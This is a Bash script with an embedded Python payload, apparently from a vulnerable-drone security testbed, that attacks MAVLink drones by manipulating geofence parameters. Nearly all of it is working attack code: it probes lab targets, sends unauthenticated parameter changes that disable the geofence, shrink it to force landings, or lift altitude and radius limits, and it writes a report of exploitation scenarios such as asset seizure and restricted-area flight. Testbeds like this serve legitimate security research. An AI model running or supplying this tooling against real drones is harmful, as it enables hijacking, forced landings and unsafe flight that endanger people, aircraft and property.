#!/bin/bash
# geofencing_attack.sh - 지오펜스 공격 도구
# Path: /home/kali/MTD/MTD_full_testbed/dvd_lite/dvd_attacks/denial_of_service/geofencing_attack.sh

source "$(dirname "$0")/../common/colors.sh"
source "$(dirname "$0")/../common/utils.sh"

ATTACK_NAME="Geofencing Attack"
LOG_FILE="$(get_log_dir)/geofencing_attack.log"

print_banner() {
    echo -e "${CYAN}"
    echo "╔═══════════════════════════════════════╗"
    echo "║          Geofenching Attack           ║"
    echo "╚═══════════════════════════════════════╝"
    echo -e "${NC}"
}

check_prerequisites() {
    log_info "Checking prerequisites..."
    
    local required_tools=("python3" "pip3")
    for tool in "${required_tools[@]}"; do
        if ! command -v "$tool" &> /dev/null; then
            log_error "$tool is not installed"
            exit 1
        fi
    done
    
    # Python 라이브러리 확인 및 설치
    if ! python3 -c "import pymavlink" 2>/dev/null; then
        log_info "Installing pymavlink..."
        pip3 install pymavlink >/dev/null 2>&1
    fi
    
    if ! python3 -c "import scapy" 2>/dev/null; then
        log_info "Installing scapy..."
        pip3 install scapy >/dev/null 2>&1
    fi
    
    log_success "Prerequisites check completed"
}

detect_mavlink_targets() {
    log_info "Detecting MAVLink targets..."
    
    local targets=()
    local network_mode=""
    
    # 네트워크 모드 감지
    if ip addr show | grep -q "192.168.13"; then
        network_mode="wifi"
        targets+=("192.168.13.1:5760" "192.168.13.14:14550")
        log_info "WiFi mode detected"
    elif ip addr show | grep -q "10.13.0"; then
        network_mode="docker"
        targets+=("10.13.0.3:5760" "10.13.0.4:14550")
        log_info "Docker bridge mode detected"
    else
        network_mode="generic"
        targets+=("127.0.0.1:5760" "127.0.0.1:14550")
        log_warning "Generic network mode, using localhost targets"
    fi
    
    echo -e "${CYAN}Potential MAVLink targets:${NC}"
    for target in "${targets[@]}"; do
        echo "  └─ $target"
    done
    
    echo "$network_mode:${targets[*]}"
}

test_mavlink_connectivity() {
    local target="$1"
    
    log_info "Testing connectivity to $target..."
    
    local ip=$(echo "$target" | cut -d: -f1)
    local port=$(echo "$target" | cut -d: -f2)
    
    # 포트 연결 테스트
    if timeout 5 bash -c "</dev/tcp/$ip/$port" 2>/dev/null; then
        log_success "Connection to $target successful"
        return 0
    else
        log_warning "Connection to $target failed"
        return 1
    fi
}

create_geofencing_attack_script() {
    local script_path="/tmp/geofencing_attack.py"
    
    cat > "$script_path" << 'EOF'
#!/usr/bin/env python3
"""
MAVLink 지오펜스 공격 스크립트
"""

import sys
import time
import socket
import struct
from pymavlink import mavutil
from scapy.all import *

class GeofencingAttack:
    def __init__(self, target_ip, target_port):
        self.target_ip = target_ip
        self.target_port = target_port
        self.mav = None
        self.connect()
    
    def connect(self):
        """MAVLink 연결"""
        try:
            connection_string = f'tcp:{self.target_ip}:{self.target_port}'
            self.mav = mavutil.mavlink_connection(connection_string, timeout=10)
            self.mav.wait_heartbeat(timeout=10)
            print(f"[+] Connected to {self.target_ip}:{self.target_port}")
            return True
        except Exception as e:
            print(f"[-] Connection failed: {e}")
            return False
    
    def set_param(self, param_id, param_value, param_type):
        """파라미터 설정"""
        try:
            packet = self.mav.param_set_encode(
                target_system=self.mav.target_system,
                target_component=self.mav.target_component,
                param_id=param_id.encode('utf-8'),
                param_value=param_value,
                param_type=param_type
            ).pack(self.mav)
            
            return packet
        except Exception as e:
            print(f"[-] Parameter encoding failed: {e}")
            return None
    
    def send_packet_tcp(self, packet_data):
        """TCP를 통한 패킷 전송"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((self.target_ip, self.target_port))
            sock.send(packet_data)
            sock.close()
            return True
        except Exception as e:
            print(f"[-] TCP send failed: {e}")
            return False
    
    def disable_geofence(self):
        """지오펜스 비활성화"""
        print("[*] Disabling geofence...")
        
        packet = self.set_param('FENCE_ENABLE', 0, mavutil.mavlink.MAV_PARAM_TYPE_UINT8)
        if packet and self.send_packet_tcp(packet):
            print("[+] Geofence disabled")
            return True
        return False
    
    def enable_geofence(self):
        """지오펜스 활성화"""
        print("[*] Enabling geofence...")
        
        packet = self.set_param('FENCE_ENABLE', 1, mavutil.mavlink.MAV_PARAM_TYPE_UINT8)
        if packet and self.send_packet_tcp(packet):
            print("[+] Geofence enabled")
            return True
        return False
    
    def set_fence_radius(self, radius):
        """지오펜스 반경 설정"""
        print(f"[*] Setting fence radius to {radius} meters...")
        
        # 먼저 지오펜스 활성화
        enable_packet = self.set_param('FENCE_ENABLE', 1, mavutil.mavlink.MAV_PARAM_TYPE_UINT8)
        if enable_packet:
            self.send_packet_tcp(enable_packet)
        
        # 반경 설정
        radius_packet = self.set_param('FENCE_RADIUS', radius, mavutil.mavlink.MAV_PARAM_TYPE_REAL32)
        if radius_packet and self.send_packet_tcp(radius_packet):
            print(f"[+] Fence radius set to {radius} meters")
            return True
        return False
    
    def set_fence_altitude(self, altitude):
        """지오펜스 최대 고도 설정"""
        print(f"[*] Setting fence max altitude to {altitude} meters...")
        
        # 먼저 지오펜스 활성화
        enable_packet = self.set_param('FENCE_ENABLE', 1, mavutil.mavlink.MAV_PARAM_TYPE_UINT8)
        if enable_packet:
            self.send_packet_tcp(enable_packet)
        
        # 고도 설정
        alt_packet = self.set_param('FENCE_ALT_MAX', altitude, mavutil.mavlink.MAV_PARAM_TYPE_REAL32)
        if alt_packet and self.send_packet_tcp(alt_packet):
            print(f"[+] Fence max altitude set to {altitude} meters")
            return True
        return False
    
    def set_fence_action(self, action):
        """지오펜스 위반 시 동작 설정"""
        print(f"[*] Setting fence breach action to {action}...")
        
        # 먼저 지오펜스 활성화
        enable_packet = self.set_param('FENCE_ENABLE', 1, mavutil.mavlink.MAV_PARAM_TYPE_UINT8)
        if enable_packet:
            self.send_packet_tcp(enable_packet)
        
        # 동작 설정
        action_packet = self.set_param('FENCE_ACTION', action, mavutil.mavlink.MAV_PARAM_TYPE_UINT8)
        if action_packet and self.send_packet_tcp(action_packet):
            action_names = {0: "None", 1: "RTL", 2: "Land", 3: "SmartRTL", 4: "Brake"}
            action_name = action_names.get(action, "Unknown")
            print(f"[+] Fence breach action set to {action} ({action_name})")
            return True
        return False
    
    def create_malicious_fence(self, tiny_radius=5, low_altitude=10):
        """악의적인 지오펜스 생성 (매우 작은 영역)"""
        print("[*] Creating malicious geofence...")
        
        success = True
        
        # 매우 작은 반경 설정
        if not self.set_fence_radius(tiny_radius):
            success = False
        
        # 매우 낮은 고도 설정
        if not self.set_fence_altitude(low_altitude):
            success = False
        
        # 강제 착륙 설정
        if not self.set_fence_action(2):  # Land
            success = False
        
        if success:
            print(f"[+] Malicious geofence created (radius: {tiny_radius}m, altitude: {low_altitude}m)")
        
        return success
    
    def fence_bypass_attack(self):
        """지오펜스 우회 공격"""
        print("[*] Attempting geofence bypass...")
        
        # 다양한 우회 시도
        bypass_attempts = [
            ("Disable fence", lambda: self.disable_geofence()),
            ("Set huge radius", lambda: self.set_fence_radius(99999)),
            ("Set high altitude", lambda: self.set_fence_altitude(99999)),
            ("Disable action", lambda: self.set_fence_action(0)),
        ]
        
        results = {}
        for name, func in bypass_attempts:
            print(f"[*] Trying: {name}")
            results[name] = func()
            time.sleep(1)
        
        return results
    
    def monitor_fence_status(self, duration=30):
        """지오펜스 상태 모니터링"""
        print(f"[*] Monitoring fence status for {duration} seconds...")
        
        start_time = time.time()
        fence_events = []
        
        while time.time() - start_time < duration:
            try:
                msg = self.mav.recv_match(blocking=False, timeout=1)
                if msg:
                    msg_type = msg.get_type()
                    
                    # 지오펜스 관련 메시지 모니터링
                    if msg_type in ['FENCE_STATUS', 'SYS_STATUS', 'STATUSTEXT']:
                        fence_events.append({
                            'timestamp': time.time(),
                            'type': msg_type,
                            'data': str(msg)
                        })
                        print(f"[*] Fence event: {msg_type}")
                
                time.sleep(0.1)
                
            except Exception as e:
                print(f"[-] Monitoring error: {e}")
                break
        
        print(f"[+] Monitoring completed. {len(fence_events)} events captured")
        return fence_events

def main():
    if len(sys.argv) != 4:
        print("Usage: python3 geofencing_attack.py <ip> <port> <action>")
        print("Actions:")
        print("  disable      - Disable geofence")
        print("  enable       - Enable geofence") 
        print("  bypass       - Attempt geofence bypass")
        print("  malicious    - Create malicious geofence")
        print("  radius:N     - Set fence radius to N meters")
        print("  altitude:N   - Set fence max altitude to N meters")
        print("  action:N     - Set fence action (0=None, 1=RTL, 2=Land)")
        print("  monitor      - Monitor fence status")
        sys.exit(1)
    
    target_ip = sys.argv[1]
    target_port = int(sys.argv[2])
    action = sys.argv[3]
    
    # 공격 객체 생성
    attack = GeofencingAttack(target_ip, target_port)
    
    if not attack.mav:
        print("[-] Failed to connect to target")
        sys.exit(1)
    
    # 액션 실행
    if action == "disable":
        attack.disable_geofence()
    elif action == "enable":
        attack.enable_geofence()
    elif action == "bypass":
        results = attack.fence_bypass_attack()
        print(f"[+] Bypass results: {results}")
    elif action == "malicious":
        attack.create_malicious_fence()
    elif action.startswith("radius:"):
        radius = float(action.split(":")[1])
        attack.set_fence_radius(radius)
    elif action.startswith("altitude:"):
        altitude = float(action.split(":")[1])
        attack.set_fence_altitude(altitude)
    elif action.startswith("action:"):
        action_code = int(action.split(":")[1])
        attack.set_fence_action(action_code)
    elif action == "monitor":
        events = attack.monitor_fence_status(30)
        print(f"[+] Captured {len(events)} fence events")
    else:
        print(f"[-] Unknown action: {action}")

if __name__ == "__main__":
    main()
EOF

    chmod +x "$script_path"
    echo "$script_path"
}

execute_geofence_attack() {
    local target="$1"
    local attack_type="$2"
    
    log_info "Executing geofence attack against $target..."
    
    local ip=$(echo "$target" | cut -d: -f1)
    local port=$(echo "$target" | cut -d: -f2)
    
    local script_path=$(create_geofencing_attack_script)
    
    echo -e "${YELLOW}[*] Target: $target${NC}"
    echo -e "${YELLOW}[*] Attack Type: $attack_type${NC}"
    echo -e "${CYAN}[*] Executing attack...${NC}"
    
    local attack_output=""
    local success=false
    
    case "$attack_type" in
        "disable")
            echo -e "${RED}[!] Attempting to disable geofence${NC}"
            attack_output=$(python3 "$script_path" "$ip" "$port" "disable" 2>&1)
            [[ $? -eq 0 ]] && success=true
            ;;
        "malicious")
            echo -e "${RED}[!] Creating malicious geofence${NC}"
            attack_output=$(python3 "$script_path" "$ip" "$port" "malicious" 2>&1)
            [[ $? -eq 0 ]] && success=true
            ;;
        "bypass")
            echo -e "${RED}[!] Attempting geofence bypass${NC}"
            attack_output=$(python3 "$script_path" "$ip" "$port" "bypass" 2>&1)
            [[ $? -eq 0 ]] && success=true
            ;;
        "tiny_radius")
            echo -e "${RED}[!] Setting extremely small radius${NC}"
            attack_output=$(python3 "$script_path" "$ip" "$port" "radius:1" 2>&1)
            [[ $? -eq 0 ]] && success=true
            ;;
        "low_altitude")
            echo -e "${RED}[!] Setting dangerously low altitude limit${NC}"
            attack_output=$(python3 "$script_path" "$ip" "$port" "altitude:5" 2>&1)
            [[ $? -eq 0 ]] && success=true
            ;;
        "force_land")
            echo -e "${RED}[!] Setting fence action to force landing${NC}"
            attack_output=$(python3 "$script_path" "$ip" "$port" "action:2" 2>&1)
            [[ $? -eq 0 ]] && success=true
            ;;
    esac
    
    echo "$attack_output"
    
    if $success; then
        log_success "Geofence attack executed successfully"
    else
        log_warning "Geofence attack may have failed"
    fi
    
    rm -f "$script_path"
    
    echo "$success:$attack_output"
}

test_geofence_parameters() {
    local target="$1"
    
    log_info "Testing geofence parameters on $target..."
    
    local ip=$(echo "$target" | cut -d: -f1)
    local port=$(echo "$target" | cut -d: -f2)
    
    local script_path=$(create_geofencing_attack_script)
    
    # 다양한 파라미터 테스트
    local test_scenarios=(
        "radius:0.1:Minimal radius test"
        "radius:100000:Maximum radius test"
        "altitude:0.5:Ground level altitude"
        "altitude:50000:Space altitude test"
        "action:0:No action test"
        "action:2:Force land test"
    )
    
    echo -e "${GREEN}=== Geofence Parameter Tests ===${NC}"
    
    local test_results=()
    
    for scenario in "${test_scenarios[@]}"; do
        local param=$(echo "$scenario" | cut -d: -f1,2)
        local description=$(echo "$scenario" | cut -d: -f3)
        
        echo -e "${CYAN}Testing: $description${NC}"
        
        local result=$(python3 "$script_path" "$ip" "$port" "$param" 2>&1)
        local exit_code=$?
        
        if [[ $exit_code -eq 0 ]] && echo "$result" | grep -q "\[+\]"; then
            echo "  └─ ${GREEN}SUCCESS${NC}"
            test_results+=("$description:SUCCESS")
        else
            echo "  └─ ${RED}FAILED${NC}"
            test_results+=("$description:FAILED")
        fi
        
        sleep 2
    done
    
    rm -f "$script_path"
    
    echo -e "${GREEN}=== Test Summary ===${NC}"
    for result in "${test_results[@]}"; do
        local desc=$(echo "$result" | cut -d: -f1)
        local status=$(echo "$result" | cut -d: -f2)
        
        if [[ "$status" == "SUCCESS" ]]; then
            echo "  └─ $desc: ${GREEN}$status${NC}"
        else
            echo "  └─ $desc: ${RED}$status${NC}"
        fi
    done
}

monitor_geofence_effects() {
    local target="$1"
    local monitoring_duration="${2:-30}"
    
    log_info "Monitoring geofence effects..."
    
    local ip=$(echo "$target" | cut -d: -f1)
    local port=$(echo "$target" | cut -d: -f2)
    
    local script_path=$(create_geofencing_attack_script)
    
    echo -e "${YELLOW}[*] Monitoring fence status for ${monitoring_duration} seconds...${NC}"
    
    local monitor_output=$(python3 "$script_path" "$ip" "$port" "monitor" 2>&1)
    
    echo "$monitor_output"
    
    # 이벤트 분석
    local fence_events=$(echo "$monitor_output" | grep "Fence event" | wc -l)
    local error_events=$(echo "$monitor_output" | grep -i "error\|fail" | wc -l)
    
    echo -e "${GREEN}=== Monitoring Summary ===${NC}"
    echo "  └─ Fence events detected: $fence_events"
    echo "  └─ Error events: $error_events"
    echo "  └─ Monitoring duration: ${monitoring_duration}s"
    
    rm -f "$script_path"
}

perform_comprehensive_attack() {
    local target="$1"
    
    log_info "Performing comprehensive geofence attack..."
    
    local attack_scenarios=(
        "disable:Disable geofence protection"
        "malicious:Create malicious fence"
        "bypass:Attempt fence bypass"
        "tiny_radius:Set minimal radius"
        "low_altitude:Set dangerous altitude"
        "force_land:Force landing action"
    )
    
    echo -e "${GREEN}=== Comprehensive Geofence Attack ===${NC}"
    
    local attack_results=()
    local successful_attacks=0
    
    for scenario in "${attack_scenarios[@]}"; do
        local attack_type=$(echo "$scenario" | cut -d: -f1)
        local description=$(echo "$scenario" | cut -d: -f2)
        
        echo -e "\n${CYAN}[*] Attack: $description${NC}"
        
        local result=$(execute_geofence_attack "$target" "$attack_type")
        local success=$(echo "$result" | cut -d: -f1)
        local output=$(echo "$result" | cut -d: -f2-)
        
        if [[ "$success" == "true" ]]; then
            ((successful_attacks++))
            attack_results+=("$description:SUCCESS")
            echo -e "${GREEN}  └─ Attack succeeded${NC}"
        else
            attack_results+=("$description:FAILED")
            echo -e "${RED}  └─ Attack failed${NC}"
        fi
        
        # 공격 간 대기
        sleep 3
    done
    
    echo -e "\n${GREEN}=== Attack Summary ===${NC}"
    echo "  └─ Total attacks: ${#attack_scenarios[@]}"
    echo "  └─ Successful attacks: $successful_attacks"
    echo "  └─ Success rate: $((successful_attacks * 100 / ${#attack_scenarios[@]}))%"
    
    echo -e "\n${CYAN}Attack Details:${NC}"
    for result in "${attack_results[@]}"; do
        local desc=$(echo "$result" | cut -d: -f1)
        local status=$(echo "$result" | cut -d: -f2)
        
        if [[ "$status" == "SUCCESS" ]]; then
            echo "  └─ $desc: ${GREEN}$status${NC}"
        else
            echo "  └─ $desc: ${RED}$status${NC}"
        fi
    done
    
    echo "$successful_attacks:${#attack_scenarios[@]}"
}

generate_geofence_report() {
    local target="$1"
    local attack_summary="$2"
    
    log_info "Generating geofence attack report..."
    
    local successful=$(echo "$attack_summary" | cut -d: -f1)
    local total=$(echo "$attack_summary" | cut -d: -f2)
    local success_rate=$((successful * 100 / total))
    
    local report_file="$(get_log_dir)/geofence_attack_report_$(date +%Y%m%d_%H%M%S).txt"
    
    cat > "$report_file" << EOF
╔═══════════════════════════════════════════════════╗
║             Geofencing Attack Report              ║
╚═══════════════════════════════════════════════════╝

Date: $(date)
Attack Type: Geofencing Manipulation
Target: $target
Success Rate: ${success_rate}% (${successful}/${total})

╔═══ ATTACK SUMMARY ═══╗

Target System: MAVLink Drone
Attack Vector: Parameter Manipulation
Protocol: MAVLink (TCP)
Parameters Targeted:
  - FENCE_ENABLE
  - FENCE_RADIUS  
  - FENCE_ALT_MAX
  - FENCE_ACTION

╔═══ ATTACK EXECUTION ═══╗

$(cat "$LOG_FILE" | grep -A 20 "Comprehensive Geofence Attack" | tail -20)

╔═══ PARAMETER TESTS ═══╗

$(cat "$LOG_FILE" | grep -A 15 "Geofence Parameter Tests" | tail -15)

╔═══ SECURITY IMPLICATIONS ═══╗

1. Parameter Security
   - Unprotected MAVLink parameters
   - No parameter change authentication
   - Real-time parameter modification

2. Flight Safety Impact
   - Geofence bypass potential
   - Forced landing scenarios
   - Restricted area intrusion

3. Operational Risks
   - Mission compromise
   - Asset loss potential
   - Safety system override

╔═══ ATTACK CAPABILITIES ═══╗

1. Geofence Disabling
   - Complete fence removal
   - Unrestricted flight area
   - Safety system bypass

2. Malicious Fence Creation
   - Extremely small operating area
   - Immediate landing triggers
   - Mission interruption

3. Parameter Manipulation
   - Radius modification
   - Altitude limit changes
   - Breach action control

╔═══ EXPLOITATION SCENARIOS ═══╗

1. Mission Disruption
   - Force emergency landing
   - Prevent takeoff operations
   - Interrupt autonomous flight

2. Asset Seizure
   - Force landing in specific location
   - Redirect to attacker-controlled area
   - Prevent return-to-home

3. Safety Override
   - Remove flight restrictions
   - Enable restricted area flight
   - Bypass operational limits

╔═══ DEFENSIVE RECOMMENDATIONS ═══╗

1. 통신 보안
   - MAVLink 메시지 서명 활성화
   - 암호화된 통신 채널 사용
   - 파라미터 변경 인증 구현

2. 시스템 강화
   - 중요 파라미터 쓰기 보호
   - 파라미터 변경 로깅
   - 비정상 변경 탐지

3. 운영 절차
   - 지오펜스 상태 모니터링
   - 파라미터 무결성 검증
   - 백업 안전 시스템 구현

╚═══════════════════════╝
EOF

    log_success "Report saved to: $report_file"
    echo -e "${GREEN}Report location: $report_file${NC}"
}

cleanup() {
    log_info "Cleaning up temporary files..."
    rm -f /tmp/geofencing_attack.py 2>/dev/null
}

main() {
    print_banner
    check_prerequisites
    
    log_info "Starting geofencing attack..."
    echo "Attack: $ATTACK_NAME" >> "$LOG_FILE"
    echo "Timestamp: $(date)" >> "$LOG_FILE"
    echo "================================" >> "$LOG_FILE"
    
    # MAVLink 타겟 탐지
    local target_info=$(detect_mavlink_targets)
    local network_mode=$(echo "$target_info" | cut -d: -f1)
    local targets=($(echo "$target_info" | cut -d: -f2-))
    
    # 연결 가능한 타겟 찾기
    local active_target=""
    for target in "${targets[@]}"; do
        if test_mavlink_connectivity "$target"; then
            active_target="$target"
            break
        fi
    done
    
    if [[ -z "$active_target" ]]; then
        log_error "No active MAVLink targets found"
        exit 1
    fi
    
    echo -e "\n${BLUE}[*] Active target: $active_target${NC}"
    
    # 파라미터 테스트
    echo -e "\n${BLUE}[*] Testing geofence parameters...${NC}"
    test_geofence_parameters "$active_target" | tee -a "$LOG_FILE"
    
    # 종합 공격 실행
    echo -e "\n${BLUE}[*] Executing comprehensive attack...${NC}"
    local attack_summary=$(perform_comprehensive_attack "$active_target")
    
    # 효과 모니터링
    echo -e "\n${BLUE}[*] Monitoring attack effects...${NC}"
    monitor_geofence_effects "$active_target" 30 | tee -a "$LOG_FILE"
    
    # 보고서 생성
    generate_geofence_report "$active_target" "$attack_summary"
    
    cleanup
    
    log_success "Geofencing attack completed"
    echo "Attack completed at $(date)" >> "$LOG_FILE"
}

# Signal handlers for graceful cleanup
trap cleanup EXIT
trap 'echo -e "\n${RED}Attack interrupted${NC}"; cleanup; exit 1' INT TERM

# Execute main function
main "$@"